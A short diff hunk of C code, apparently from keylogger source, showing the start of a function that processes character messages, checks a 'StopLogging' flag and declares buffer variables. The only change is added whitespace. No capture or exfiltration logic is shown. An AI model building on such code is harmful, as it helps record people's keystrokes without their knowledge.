@@ -685,7 +685,7 @@ void ProcessCharMessage2(PMSG Msg, bool IsUnicode)
 
 	if (KLG.StopLogging)
     	return;
-
+  
 	PCHAR Buf = NULL;
 	DWORD BufLen = 0;
 	bool FreeBuf = false;
